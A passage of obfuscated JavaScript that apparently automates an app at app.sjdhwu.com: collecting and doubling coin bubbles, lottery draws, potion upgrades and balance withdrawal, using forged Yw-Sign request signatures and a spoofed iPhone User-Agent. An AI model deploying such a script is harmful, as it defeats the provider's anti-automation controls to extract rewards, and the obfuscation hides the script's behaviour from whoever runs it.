exchangeExperiencePotion(_0xfb0284,_0x2d27b3[_0x4776c3(0x34e)],_0x1acb62)),_0x2d27b3['code']==0xc8&&console[_0x421b89(0x2a5,'UD06')](_0x42bb8a(0x228)),_0x2d27b3[_0x421b89(0x22a,'*DhG')]==0x1f4&&_0x2d27b3[_0x42bb8a(0x311)]==null&&console['log'](_0x4776c3(0x27a),_0x2d27b3[_0x421b89(0x278,'RQ@[')]);}catch(_0x2d4c32){}finally{_0x2d530f();}},_0x6c3d98);});}function _0x2a99(_0x30bfdc,_0x107670){const _0x517c5d=_0x517c();return _0x2a99=function(_0x3b7deb,_0x57561c){_0x3b7deb=_0x3b7deb-0x1e6;let _0x558ea8=_0x517c5d[_0x3b7deb];if(_0x2a99['WeFeEL']===undefined){var _0x4c808b=function(_0x2a99d2){const _0x4582d9='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x3159ca='',_0x48df7c='';for(let _0x408b9f=0x0,_0x32f18d,_0x51bbc0,_0x4a20b1=0x0;_0x51bbc0=_0x2a99d2['charAt'](_0x4a20b1++);~_0x51bbc0&&(_0x32f18d=_0x408b9f%0x4?_0x32f18d*0x40+_0x51bbc0:_0x51bbc0,_0x408b9f++%0x4)?_0x3159ca+=String['fromCharCode'](0xff&_0x32f18d>>(-0x2*_0x408b9f&0x6)):0x0){_0x51bbc0=_0x4582d9['indexOf'](_0x51bbc0);}for(let _0x4de330=0x0,_0x2a0141=_0x3159ca['length'];_0x4de330<_0x2a0141;_0x4de330++){_0x48df7c+='%'+('00'+_0x3159ca['charCodeAt'](_0x4de330)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x48df7c);};_0x2a99['sHsRod']=_0x4c808b,_0x30bfdc=arguments,_0x2a99['WeFeEL']=!![];}const _0x3508e3=_0x517c5d[0x0],_0x428033=_0x3b7deb+_0x3508e3,_0xf30eb=_0x30bfdc[_0x428033];return!_0xf30eb?(_0x558ea8=_0x2a99['sHsRod'](_0x558ea8),_0x30bfdc[_0x428033]=_0x558ea8):_0x558ea8=_0xf30eb,_0x558ea8;},_0x2a99(_0x30bfdc,_0x107670);}function prizeGet(_0x251de1='',_0x2f00c3='',_0x4bdef2=0x0){return new Promise(_0x4e55ab=>{const _0x2a1f51=_0x3b7d,_0x48aa45=_0x2a99,_0x1d59a8=_0x4a20;let _0x19048e=parseInt(Date['parse'](new Date())/0x3e8),_0x4635d1=MD5Encrypt(_0x19048e+_0x1d59a8(0x328,'*DhG')+key+'--'+key)[_0x1d59a8(0x2a6,'iO!T')]();_0x19048e=_0x2f00c3?_0x2f00c3:_0x19048e,_0x4635d1=_0x251de1?_0x251de1:_0x4635d1;let _0x427af2={'url':'https://app.sjdhwu.com/yw_api/v3/prizeGet/','headers':{'Host':_0x48aa45(0x2ad),'version':'v3','plat':'1','Authorization':_0x2a1f51(0x27d)+token,'X-Requested-With':_0x1d59a8(0x2e8,'loX$'),'Accept-Language':_0x48aa45(0x258),'Accept-Encoding':_0x48aa45(0x1f1),'Accept':'*/*','Yw-Number':'10470706','User-Agent':_0x2a1f51(0x24d),'Content-Length':'0','Yw-Sign':_0x4635d1,'Connection':_0x48aa45(0x25d),'Yw-Time':_0x19048e,'Cookie':cookie,'sign':_0x48aa45(0x26c)}};$['get'](_0x427af2,async(_0x26543e,_0x3208a7,_0x303bb2)=>{const _0x38ea77=_0x2a1f51,_0x1778fb=_0x1d59a8,_0x144f9f=_0x48aa45;try{const _0x311802=JSON[_0x144f9f(0x279)](_0x303bb2);_0x311802[_0x1778fb(0x2d3,'ycEU')]==0x1f4&&_0x311802[_0x38ea77(0x311)]&&(await $[_0x144f9f(0x24e)](0x1f4),await prizeGet(_0x311802[_0x144f9f(0x34e)],_0x19048e)),_0x311802[_0x38ea77(0x20c)]==0xc8&&(_0x311802[_0x1778fb(0x28f,'WFU6')][_0x1778fb(0x244,'*qCn')]==''?console['log']('抽奖获取：'+_0x311802['data'][_0x1778fb(0x30f,'51ib')]):(console[_0x38ea77(0x2f4)](_0x38ea77(0x255)+_0x311802[_0x144f9f(0x34e)][_0x1778fb(0x312,'Ur8b')]),await flopDoubled(_0x311802[_0x38ea77(0x311)][_0x144f9f(0x364)])),await prizeGet()),_0x311802[_0x38ea77(0x20c)]==0x1f4&&_0x311802[_0x38ea77(0x311)]==null&&console['log'](_0x144f9f(0x1f8),_0x311802[_0x38ea77(0x232)]);}catch(_0x5be79b){}finally{_0x4e55ab();}},_0x4bdef2);});}function freeFlops(_0x2ba6d5='',_0x5900b8='',_0xff8e52=0x0){return new Promise(_0x51aa3=>{const _0x3fb696=_0x3b7d,_0x576540=_0x4a20,_0x243612=_0x2a99;let _0x57e437=parseInt(Date[_0x243612(0x279)](new Date())/0x3e8),_0x3b70b1=MD5Encrypt(_0x57e437+_0x243612(0x206)+key+'--'+key)[_0x576540(0x229,'6*u0')]();_0x57e437=_0x5900b8?_0x5900b8:_0x57e437,_0x3b70b1=_0x2ba6d5?_0x2ba6d5:_0x3b70b1;let _0xf34e3e={'url':_0x576540(0x309,'Ur8b'),'headers':{'Host':_0x576540(0x369,'aI&O'),'version':'v3','plat':'1','Authorization':_0x576540(0x23f,'Lu^b')+token,'X-Requested-With':_0x576540(0x342,'WFU6'),'Accept-Language':_0x3fb696(0x322),'Accept-Encoding':_0x576540(0x1e7,'1dz4'),'Accept':_0x3fb696(0x2ba),'Yw-Number':_0x3fb696(0x2b7),'User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Length':'0','Yw-Sign':_0x3b70b1,'Connection':'keep-alive','Yw-Time':_0x57e437,'Cookie':cookie,'sign':_0x576540(0x2ac,'M3a$')}};$[_0x3fb696(0x299)](_0xf34e3e,async(_0x475d1f,_0xa6e5de,_0x307e91)=>{const _0x12889b=_0x3fb696,_0x5ba823=_0x576540,_0x628d9b=_0x243612;try{const _0x10e604=JSON['parse'](_0x307e91);_0x10e604[_0x628d9b(0x23a)]==0x1f4&&_0x10e604[_0x628d9b(0x34e)]&&(await $[_0x628d9b(0x24e)](0x1f4),await freeFlops(_0x10e604[_0x5ba823(0x32a,'loX$')],_0x57e437)),_0x10e604[_0x5ba823(0x21f,'UD06')]==0xc8&&(console[_0x628d9b(0x316)]('增加抽奖次数成功'),await freeFlops()),_0x10e604[_0x628d9b(0x23a)]==0x1f4&&_0x10e604['data']==null&&(console[_0x5ba823(0x230,'ZN4b')](_0x5ba823(0x242,'*qCn'),_0x10e604[_0x12889b(0x232)]),_0x10e604[_0x5ba823(0x294,'G#JN')]==_0x12889b(0x264)&&(await $['wait'](0x3c8c),await freeFlops()));}catch(_0x115ac9){}finally{_0x51aa3();}},_0xff8e52);});}function flopDoubled(_0x19743c='',_0x83c18e='',_0x2a5ddf='',_0x3077a3=0x0){return new Promise(_0x2ba52f=>{const _0x1102e2=_0x4a20,_0x3aedf3=_0x2a99,_0x13375d=_0x3b7d;let _0x11f1d0=parseInt(Date[_0x13375d(0x301)](new Date())/0x3e8),_0x22a725=MD5Encrypt(_0x11f1d0+_0x3aedf3(0x206)+key+'--'+key)[_0x1102e2(0x2af,'nFdq')]();_0x11f1d0=_0x2a5ddf?_0x2a5ddf:_0x11f1d0,_0x22a725=_0x83c18e?_0x83c18e:_0x22a725;let _0x1c5505={'url':_0x1102e2(0x2c9,'zrB5'),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0x1102e2(0x217,'nFdq')+token,'X-Requested-With':_0x1102e2(0x1eb,'BZo['),'Accept-Language':_0x1102e2(0x202,'lmLq'),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x1102e2(0x274,'ycEU'),'Yw-Number':_0x1102e2(0x28e,'HyeE'),'User-Agent':_0x13375d(0x24d),'Content-Type':_0x13375d(0x2dc),'Yw-Sign':_0x22a725,'Connection':'keep-alive','Yw-Time':_0x11f1d0,'Cookie':cookie,'sign':_0x1102e2(0x2b2,'ycEU')},'body':_0x1102e2(0x26b,'lo22')+_0x19743c+'}'};$['post'](_0x1c5505,async(_0x2ed698,_0x2cb090,_0x375f3c)=>{const _0x2ffab2=_0x13375d,_0x51a1e0=_0x1102e2,_0xee097f=_0x3aedf3;try{const _0x4d836c=JSON[_0xee097f(0x279)](_0x375f3c);_0x4d836c[_0xee097f(0x23a)]==0x1f4&&_0x4d836c[_0x51a1e0(0x21e,'*qCn')]&&(await $[_0xee097f(0x24e)](0x1f4),await flopDoubled(_0x19743c,_0x4d836c[_0x2ffab2(0x311)],_0x11f1d0)),_0x4d836c['code']==0xc8&&console[_0xee097f(0x316)](_0x51a1e0(0x293,'6*u0')+_0x4d836c['data'][_0xee097f(0x304)]),_0x4d836c['code']==0x1f4&&_0x4d836c[_0xee097f(0x34e)]==null&&console[_0x2ffab2(0x2f4)](_0x2ffab2(0x280),_0x4d836c[_0xee097f(0x2a0)]);}catch(_0xa576fc){}finally{_0x2ba52f();}},_0x3077a3);});}function myClub(_0x380b8b='',_0x1b1173='',_0x13cae1=0x0){return new Promise(_0x2ee23b=>{const _0x4f4ded=_0x3b7d,_0x473131=_0x4a20,_0x1ae6ac=_0x2a99;let _0x2ee580=parseInt(Date[_0x1ae6ac(0x279)](new Date())/0x3e8),_0x3f2622=MD5Encrypt(_0x2ee580+_0x1ae6ac(0x206)+key+'--'+key)[_0x473131(0x365,'1dz4')]();_0x2ee580=_0x1b1173?_0x1b1173:_0x2ee580,_0x3f2622=_0x380b8b?_0x380b8b:_0x3f2622;let _0x48b345={'url':_0x1ae6ac(0x36c),'headers':{'Host':_0x1ae6ac(0x2ad),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x1ae6ac(0x203),'Accept-Language':_0x4f4ded(0x322),'Accept-Encoding':_0x4f4ded(0x291),'Accept':_0x1ae6ac(0x272),'Yw-Number':_0x473131(0x28d,'vwZC'),'User-Agent':_0x1ae6ac(0x2ee),'Content-Length':'0','Yw-Sign':_0x3f2622,'Connection':_0x1ae6ac(0x25d),'Yw-Time':_0x2ee580,'Cookie':cookie,'sign':'1234567890'}};$['get'](_0x48b345,async(_0x301ec8,_0x5cda88,_0x3e1353)=>{const _0x2648ab=_0x473131,_0xb9dc92=_0x1ae6ac,_0x5c0a42=_0x4f4ded;try{const _0x3402b3=JSON[_0x5c0a42(0x301)](_0x3e1353);_0x3402b3[_0xb9dc92(0x23a)]==0x1f4&&_0x3402b3[_0xb9dc92(0x34e)]&&(await $[_0x2648ab(0x2f9,'*DhG')](0x1f4),await myClub(_0x3402b3['data'],_0x2ee580));if(_0x3402b3[_0xb9dc92(0x23a)]==0xc8){console[_0x2648ab(0x23d,'Ur8b')](_0x2648ab(0x25c,'Lu^b'));let _0x4e2536=_0x3402b3['data'][_0x2648ab(0x30e,'dHA4')][0x0];console[_0xb9dc92(0x316)](_0x5c0a42(0x32e)+_0x4e2536['football_players'][_0x5c0a42(0x235)]),await upgradePotionList(_0x4e2536['id']);}_0x3402b3[_0xb9dc92(0x23a)]==0x1f4&&_0x3402b3['data']==null&&console[_0xb9dc92(0x316)]('升级球员：',_0x3402b3[_0x5c0a42(0x232)]);}catch(_0x42344f){}finally{_0x2ee23b();}},_0x13cae1);});}function upgradePotionList(_0x5bc2d8='',_0x1f9eca='',_0x1cfd31='',_0x62a082=0x0){return new Promise(_0x4b1030=>{const _0x59b2cc=_0x4a20,_0x1251bb=_0x2a99,_0x282062=_0x3b7d;let _0x1644d7=parseInt(Date[_0x282062(0x301)](new Date())/0x3e8),_0x327618=MD5Encrypt(_0x1644d7+_0x1251bb(0x24f)+key+_0x282062(0x209)+key+key+_0x282062(0x240)+key)[_0x282062(0x2df)]();_0x1644d7=_0x1cfd31?_0x1cfd31:_0x1644d7,_0x327618=_0x1f9eca?_0x1f9eca:_0x327618;let _0x4e92b5={'url':_0x1251bb(0x214),'headers':{'Host':_0x282062(0x325),'version':'v3','plat':'1','Authorization':_0x1251bb(0x239)+token,'X-Requested-With':_0x59b2cc(0x351,'ycEU'),'Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':_0x59b2cc(0x22f,'HyeE'),'Accept':_0x282062(0x2ba),'Yw-Number':'377063','User-Agent':_0x59b2cc(0x2ed,'k4E%'),'Content-Length':'0','Yw-Sign':_0x327618,'Connection':_0x59b2cc(0x24a,'QS2%'),'Yw-Time':_0x1644d7,'Cookie':cookie,'sign':_0x59b2cc(0x2b5,'nJp#')}};$[_0x59b2cc(0x32f,'mtlz')](_0x4e92b5,async(_0x426fac,_0x4ac887,_0x3f521e)=>{const _0x3d1cdd=_0x282062,_0x419bfd=_0x59b2cc,_0x7f5ef=_0x1251bb;try{const _0x3d2576=JSON[_0x7f5ef(0x279)](_0x3f521e);_0x3d2576[_0x419bfd(0x2ea,'WFU6')]==0x1f4&&_0x3d2576[_0x3d1cdd(0x311)]&&(await $[_0x3d1cdd(0x2d4)](0x1f4),await upgradePotionList(_0x5bc2d8,_0x3d2576[_0x3d1cdd(0x311)],_0x1644d7));if(_0x3d2576[_0x419bfd(0x29e,'k4E%')]==0xc8)for(let _0x5442f2 of _0x3d2576['data']['data']){console[_0x419bfd(0x2f0,'dCCT')]('使用'+_0x5442f2[_0x419bfd(0x2d9,'RXMb')]+'瓶'+_0x5442f2['has_experience_potion'][_0x3d1cdd(0x235)]),await playerPotionUpgrade(_0x5bc2d8,_0x5442f2[_0x419bfd(0x1fe,'iO!T')]['id'],_0x5442f2['number']);}_0x3d2576[_0x419bfd(0x323,'51ib')]==0x1f4&&_0x3d2576['data']==null&&console[_0x7f5ef(0x316)]('获取球员：',_0x3d2576[_0x419bfd(0x34d,'vwZC')]);}catch(_0x1b3f6a){}finally{_0x4b1030();}},_0x62a082);});}function playerPotionUpgrade(_0x4c1ce4='',_0x2705f1='',_0x56c709='',_0x354af4='',_0x5d2dfe='',_0x10e94c=0x0){return new Promise(_0x350244=>{const _0x12bca5=_0x2a99,_0x52f4bb=_0x4a20,_0x24b174=_0x3b7d;let _0x28ec2b=parseInt(Date[_0x24b174(0x301)](new Date())/0x3e8),_0x3c823a=MD5Encrypt(_0x28ec2b+_0x52f4bb(0x208,'ZN4b')+key+'experience_potion_id--'+_0x2705f1+key+key+_0x12bca5(0x270)+_0x4c1ce4+key+key+_0x52f4bb(0x224,'8$Km')+_0x56c709+key)[_0x12bca5(0x263)]();_0x28ec2b=_0x5d2dfe?_0x5d2dfe:_0x28ec2b,_0x3c823a=_0x354af4?_0x354af4:_0x3c823a;let _0x273b2e={'url':_0x24b174(0x2a9),'headers':{'Host':_0x24b174(0x325),'version':'v3','plat':'1','Authorization':_0x24b174(0x27d)+token,'X-Requested-With':_0x24b174(0x368),'Accept-Language':_0x24b174(0x322),'Accept-Encoding':_0x24b174(0x291),'Accept':_0x24b174(0x2ba),'Yw-Number':_0x24b174(0x2b7),'User-Agent':_0x52f4bb(0x2e0,'o6so'),'Content-Type':_0x52f4bb(0x250,'Wwle'),'Yw-Sign':_0x3c823a,'Connection':_0x24b174(0x238),'Yw-Time':_0x28ec2b,'Cookie':cookie,'sign':_0x52f4bb(0x335,'b%Rl')},'body':_0x24b174(0x213)+_0x2705f1+_0x12bca5(0x33b)+_0x4c1ce4+_0x24b174(0x27f)+_0x56c709+'}'};$[_0x24b174(0x299)](_0x273b2e,async(_0x30a51d,_0x29fe91,_0x110a99)=>{const _0x573c42=_0x12bca5,_0x195726=_0x24b174,_0x277081=_0x52f4bb;try{const _0x52889d=JSON[_0x277081(0x320,'b%Rl')](_0x110a99);_0x52889d['code']==0x1f4&&_0x52889d['data']&&(await $[_0x277081(0x1f5,'QS2%')](0x1f4),await playerPotionUpgrade(_0x4c1ce4,_0x2705f1,_0x56c709,_0x52889d[_0x195726(0x311)],_0x5d2dfe)),_0x52889d[_0x277081(0x302,'nJp#')]==0xc8&&console['log'](_0x573c42(0x20f)),_0x52889d['code']==0x1f4&&_0x52889d[_0x277081(0x2d2,'UD06')]==null&&console[_0x195726(0x2f4)](_0x195726(0x36b),_0x52889d['message']);}catch(_0x5dfdc6){}finally{_0x350244();}},_0x10e94c);});}function balanceWithdrawApply(_0x58a3fa='',_0x1d41d9='',_0x33db40=0x0){return new Promise(_0x25c92d=>{const _0x310407=_0x4a20,_0x3f6248=_0x2a99,_0x1e73a1=_0x3b7d;let _0x43baf6=parseInt(Date[_0x1e73a1(0x301)](new Date())/0x3e8),_0xc52efb=MD5Encrypt(_0x43baf6+_0x1e73a1(0x33c)+key+'money--'+balance+key+key+'real_name--'+name+key)[_0x1e73a1(0x2df)]();_0x43baf6=_0x1d41d9?_0x1d41d9:_0x43baf6,_0xc52efb=_0x58a3fa?_0x58a3fa:_0xc52efb;let _0x3e9118={'url':_0x3f6248(0x326),'headers':{'Host':_0x1e73a1(0x325),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x3f6248(0x203),'Accept-Language':_0x1e73a1(0x322),'Accept-Encoding':_0x310407(0x347,'vwZC'),'Accept':'*/*','Yw-Number':_0x3f6248(0x308),'User-Agent':_0x1e73a1(0x24d),'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Yw-Sign':_0xc52efb,'Connection':_0x1e73a1(0x238),'Yw-Time':_0x43baf6,'Cookie':cookie,'sign':_0x1e73a1(0x268)},'body':'money='+balance+_0x1e73a1(0x26a)+name};$[_0x3f6248(0x2e1)](_0x3e9118,async(_0x552f1d,_0x3f90dd,_0x6c04d4)=>{const _0x43d9a5=_0x310407,_0x350306=_0x1e73a1,_0xfdff3c=_0x3f6248;try{const _0x15cbaa=JSON[_0xfdff3c(0x279)](_0x6c04d4);_0x15cbaa[_0x350306(0x20c)]==0x1f4&&_0x15cbaa[_0xfdff3c(0x34e)]&&(await $[_0xfdff3c(0x24e)](0x1f4),await balanceWithdrawApply(name,_0x15cbaa['data'],_0x43baf6)),_0x15cbaa[_0x350306(0x20c)]==0xc8&&console[_0xfdff3c(0x316)]('提现：',_0x15cbaa['message']),_0x15cbaa[_0x43d9a5(0x2ef,'RXMb')]==0x1f4&&_0x15cbaa[_0x350306(0x311)]==null&&console[_0x43d9a5(0x251,'QS2%')](_0x43d9a5(0x358,'6*u0'),_0x15cbaa[_0x350306(0x232)]);}catch(_0x470bdc){}finally{_0x25c92d();}},_0x33db40);});}function homeBubbleRewardInformation(_0x41b2a9,_0x16df23='',_0x5b4d57='',_0x186ee8=0x0){return new Promise(_0x2a6529=>{const _0x2e00fb=_0x2a99,_0x558cbb=_0x3b7d,_0x203702=_0x4a20;let _0x35d390=parseInt(Date[_0x203702(0x26e,'ycEU')](new Date())/0x3e8),_0x72d59b=MD5Encrypt(_0x35d390+_0x203702(0x327,'HyeE')+key+'--'+key)[_0x203702(0x33a,'aI&O')]();_0x35d390=_0x5b4d57?_0x5b4d57:_0x35d390,_0x72d59b=_0x16df23?_0x16df23:_0x72d59b;let _0x23ff06={'url':_0x203702(0x284,'Lu^b'),'headers':{'Host':_0x558cbb(0x325),'version':'v3','plat':'1','Authorization':_0x2e00fb(0x239)+token,'X-Requested-With':_0x2e00fb(0x203),'Accept-Language':_0x558cbb(0x322),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x2e00fb(0x272),'Yw-Number':'10470706','User-Agent':_0x2e00fb(0x2ee),'Content-Type':_0x558cbb(0x2dc),'Yw-Sign':_0x72d59b,'Connection':'keep-alive','Yw-Time':_0x35d390,'Cookie':cookie,'sign':'1234567890'}};$[_0x558cbb(0x357)](_0x23ff06,async(_0x43a38c,_0x53a1fc,_0x5de875)=>{const _0x4414b0=_0x203702,_0x45f7b1=_0x2e00fb,_0x4f5d09=_0x558cbb;try{const _0x2034ac=JSON[_0x4f5d09(0x301)](_0x5de875);_0x2034ac[_0x4f5d09(0x20c)]==0x1f4&&_0x2034ac['data']&&(await $[_0x45f7b1(0x24e)](0x1f4),await homeBubbleRewardInformation(_0x41b2a9,_0x2034ac[_0x4414b0(0x339,'zrB5')],_0x35d390));if(_0x2034ac[_0x4f5d09(0x20c)]==0xc8)for(let _0x2c23a6 of _0x2034ac['data']){await homeBubbleRewardCollection(_0x2c23a6['type']),await $['wait'](0x1f4);}_0x2034ac[_0x45f7b1(0x23a)]==0x1f4&&_0x2034ac[_0x45f7b1(0x34e)]==null&&console[_0x4f5d09(0x2f4)](_0x45f7b1(0x223),_0x2034ac[_0x4414b0(0x334,'nFdq')]);}catch(_0x429a82){}finally{_0x2a6529();}},_0x186ee8);});}function homeBubbleRewardCollection(_0xc8b5f7,_0x26e319='',_0xfd810e='',_0x31e2c3=0x0){return new Promise(_0x4353e6=>{const _0x2fd786=_0x3b7d,_0x4df65a=_0x4a20,_0x24ec2a=_0x2a99;let _0x33422d=parseInt(Date['parse'](new Date())/0x3e8),_0x59bd35=MD5Encrypt(_0x33422d+_0x24ec2a(0x2e6)+key+_0x24ec2a(0x35f)+_0xc8b5f7+key)[_0x4df65a(0x31f,'9&ed')]();_0x33422d=_0xfd810e?_0xfd810e:_0x33422d,_0x59bd35=_0x26e319?_0x26e319:_0x59bd35;let _0x22a009={'url':_0x2fd786(0x366),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0x4df65a(0x225,'BZo[')+token,'X-Requested-With':_0x24ec2a(0x203),'Accept-Language':_0x24ec2a(0x258),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x2fd786(0x2ba),'Yw-Number':_0x2fd786(0x2b7),'User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Type':_0x2fd786(0x2dc),'Yw-Sign':_0x59bd35,'Connection':_0x2fd786(0x238),'Yw-Time':_0x33422d,'Cookie':cookie,'sign':_0x2fd786(0x268)},'body':_0x2fd786(0x310)+_0xc8b5f7+'\x22}'};$[_0x2fd786(0x299)](_0x22a009,async(_0x27a110,_0x5f2d54,_0x36dde0)=>{const _0x6e7304=_0x4df65a,_0x39c3da=_0x2fd786,_0x29072e=_0x24ec2a;try{const _0x555ba1=JSON['parse'](_0x36dde0);_0x555ba1[_0x29072e(0x23a)]==0x1f4&&_0x555ba1[_0x39c3da(0x311)]&&(await $[_0x6e7304(0x2ec,'e#8[')](0x1f4),await homeBubbleRewardCollection(_0xc8b5f7,_0x555ba1[_0x29072e(0x34e)],_0x33422d)),_0x555ba1['code']==0xc8&&(console['log']('首页气泡金币领取成功：',_0x555ba1[_0x6e7304(0x1f4,'CWQw')][_0x6e7304(0x2dd,'RQ@[')],'金币'),await homeBubbleRewardsDoubled(_0x555ba1[_0x39c3da(0x311)][_0x29072e(0x364)])),_0x555ba1[_0x6e7304(0x1fc,'ZN4b')]==0x1f4&&_0x555ba1[_0x6e7304(0x23c,'k4E%')]==null&&console[_0x29072e(0x316)](_0x29072e(0x223),_0x555ba1[_0x39c3da(0x232)]);}catch(_0x1f4562){}finally{_0x4353e6();}},_0x31e2c3);});}function homeBubbleRewardsDoubled(_0xbd4d3d,_0x160328='',_0x16388c='',_0x522fda=0x0){return new Promise(_0x439dc5=>{const _0x99cc7f=_0x2a99,_0x224589=_0x4a20,_0x4ec833=_0x3b7d;let _0x59e6a3=parseInt(Date[_0x4ec833(0x301)](new Date())/0x3e8),_0x254d03=MD5Encrypt(_0x59e6a3+'--1021148--'+key+'association_id--'+_0xbd4d3d+key)[_0x4ec833(0x2df)]();_0x59e6a3=_0x16388c?_0x16388c:_0x59e6a3,_0x254d03=_0x160328?_0x160328:_0x254d03;let _0x30aea7={'url':_0x224589(0x221,'iO!T'),'headers':{'Host':_0x4ec833(0x325),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x99cc7f(0x203),'Accept-Language':_0x99cc7f(0x258),'Accept-Encoding':_0x224589(0x22c,'Ur8b'),'Accept':_0x99cc7f(0x272),'Yw-Number':'10470706','User-Agent':_0x4ec833(0x24d),'Content-Type':'application/json','Yw-Sign':_0x254d03,'Connection':'keep-alive','Yw-Time':_0x59e6a3,'Cookie':cookie,'sign':'1234567890'},'body':'{\x22association_id\x22:\x22'+_0xbd4d3d+'\x22}'};$[_0x224589(0x236,'51ib')](_0x30aea7,async(_0x1a609b,_0x2f0b48,_0x187404)=>{const _0x40abf5=_0x99cc7f,_0xc63fdb=_0x224589,_0x4d98eb=_0x4ec833;try{const _0x1c9574=JSON['parse'](_0x187404);_0x1c9574['code']==0x1f4&&_0x1c9574[_0x4d98eb(0x311)]&&(await $[_0xc63fdb(0x1f5,'QS2%')](0x1f4),await homeBubbleRewardsDoubled(_0xbd4d3d,_0x1c9574['data'],_0x59e6a3)),_0x1c9574[_0xc63fdb(0x2fa,'dCCT')]==0xc8&&console[_0x40abf5(0x316)]('首页气泡金币翻倍成功：',_0x1c9574[_0x40abf5(0x2a0)]),_0x1c9574['code']==0x1f4&&_0x1c9574['data']==null&&console[_0x40abf5(0x316)](_0x4d98eb(0x205),_0x1c9574[_0x4d98eb(0x232)]);}catch(_0x5317e5){}finally{_0x439dc5();}},_0x522fda);});}


function MD5Encrypt(a) { function b(a, b) { return a << b | a >>> 32 - b } function c(a, b) { var c, d, e, f, g; return e = 2147483648 & a, f = 2147483648 & b, c = 1073741824 & a, d = 1073741824 & b, g = (1073741823 & a) + (1073741823 & b), c & d ? 2147483648 ^ g ^ e ^ f : c | d ? 1073741824 & g ? 3221225472 ^ g ^ e ^ f : 1073741824 ^ g ^ e ^ f : g ^ e ^ f } function d(a, b, c) { return a & b | ~a & c } function e(a, b, c) { return a & c | b & ~c } function f(a, b, c) { return a ^ b ^ c } function g(a, b, c) { return b ^ (a | ~c) } function h(a, e, f, g, h, i, j) { return a = c(a, c(c(d(e, f, g), h), j)), c(b(a, i), e) } function i(a, d, f, g, h, i, j) { return a = c(a, c(c(e(d, f, g), h), j)), c(b(a, i), d) } function j(a, d, e, g, h, i, j) { return a = c(a, c(c(f(d, e, g), h), j)), c(b(a, i), d) } function k(a, d, e, f, h, i, j) { return a = c(a, c(c(g(d, e, f), h), j)), c(b(a, i), d) } function l(a) { for (var b, c = a.length, d = c + 8, e = (d - d % 64) / 64, f = 16 * (e + 1), g = new Array(f - 1), h = 0, i = 0; c > i;)b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | a.charCodeAt(i) << h, i++; return b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | 128 << h, g[f - 2] = c << 3, g[f - 1] = c >>> 29, g } function m(a) { var b, c, d = "", e = ""; for (c = 0; 3 >= c; c++)b = a >>> 8 * c & 255, e = "0" + b.toString(16), d += e.substr(e.length - 2, 2); return d } function n(a) { a = a.replace(/\r\n/g, "\n"); for (var b = "", c = 0; c < a.length; c++) { var d = a.charCodeAt(c); 128 > d ? b += String.fromCharCode(d) : d > 127 && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192), b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128), b += String.fromCharCode(63 & d | 128)) } return b } var o, p, q, r, s, t, u, v, w, x = [], y = 7, z = 12, A = 17, B = 22, C = 5, D = 9, E = 14, F = 20, G = 4, H = 11, I = 16, J = 23, K = 6, L = 10, M = 15, N = 21; for (a = n(a), x = l(a), t = 1732584193, u = 4023233417, v = 2562383102, w = 271733878, o = 0; o < x.length; o += 16)p = t, q = u, r = v, s = w, t = h(t, u, v, w, x[o + 0], y, 3614090360), w = h(w, t, u, v, x[o + 1], z, 3905402710), v = h(v, w, t, u, x[o + 2], A, 606105819), u = h(u, v, w, t, x[o + 3], B, 3250441966), t = h(t, u, v, w, x[o + 4], y, 4118548399), w = h(w, t, u, v, x[o + 5], z, 1200080426), v = h(v, w, t, u, x[o + 6], A, 2821735955), u = h(u, v, w, t, x[o + 7], B, 4249261313), t = h(t, u, v, w, x[o + 8], y, 1770035416), w = h(w, t, u, v, x[o + 9], z, 2336552879), v = h(v, w, t, u, x[o + 10], A, 4294925233), u = h(u, v, w, t, x[o + 11], B, 2304563134), t = h(t, u, v, w, x[o + 12], y, 1804603682), w = h(w, t, u, v, x[o + 13], z, 4254626195), v = h(v, w, t, u, x[o + 14], A, 2792965006), u = h(u, v, w, t, x[o + 15], B, 1236535329), t = i(t, u, v, w, x[o + 1], C, 4129170786), w = i(w, t, u, v, x[o + 6], D, 3225465664), v = i(v, w, t, u, x[o + 11], E, 643717713), u = i(u, v, w, t, x[o + 0], F, 3921069994), t = i(t, u, v, w, x[o + 5], C, 3593408605), w = i(w, t, u, v, x[o + 10], D, 38016083), v = i(v, w, t, u, x[o + 15], E, 3634488961), u = i(u, v, w, t, x[o + 4], F, 3889429448), t = i(t, u, v, w, x[o + 9], C, 568446438), w = i(w, t, u, v, x[o + 14], D, 3275163606), v = i(v, w, t, u, x[o + 3], E, 4107603335), u = i(u, v, w, t, x[o + 8], F, 1163531501), t = i(t, u, v, w, x[o + 13], C, 2850285829), w = i(w, t, u, v, x[o + 2], D, 4243563512), v = i(v, w, t, u, x[o + 7], E, 1735328473), u = i(u, v, w, t, x[o + 12], F, 2368359562), t = j(t, u, v, w, x[o + 5], G, 4294588738), w = j(w, t, u, v, x[o + 8], H, 2272392833), v = j(v, w, t, u, x[o + 11], I, 1839030562), u = j(u, v, w, t, x[o + 14], J, 4259657740), t = j(t, u, v, w, x[o + 1], G, 2763975236), w = j(w, t, u, v, x[o + 4], H, 1272893353), v = j(v, w, t, u, x[o + 7], I, 4139469664), u = j(u, v, w, t, x[o + 10], J, 3200236656), t = j(t, u, v, w, x[o + 13], G, 681279174), w = j(w, t, u, v, x[o + 0], H, 3936430074), v = j(v, w, t, u, x[o + 3], I, 